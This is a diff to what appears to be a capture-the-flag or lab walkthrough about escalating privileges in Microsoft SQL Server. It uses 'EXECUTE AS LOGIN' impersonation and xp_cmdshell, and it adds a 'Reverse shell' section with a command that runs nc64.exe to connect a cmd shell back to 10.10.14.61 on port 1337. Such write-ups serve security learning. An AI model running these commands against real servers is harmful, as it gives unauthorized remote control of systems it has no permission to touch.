@@ -254,6 +254,8 @@ However the user does not have SeImpersonatePrivilege
 EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';
 ```
 
+# Reverse shell
+
 ![](Pasted%20image%2020261003141536.png)
 
 A powershell reverse shell payload fails, it gets blocked by AV
@@ -283,10 +285,12 @@ EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c dir -force C:\ProgramDa
 As seen here the file exists
 
 ```python
-
+EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c C:\ProgramData\nc64.exe -e cmd 10.10.14.61 1337';
 ```
 
 ![](Pasted%20image%2020261003142333.png)
+
+I now have a shell
 
 
 
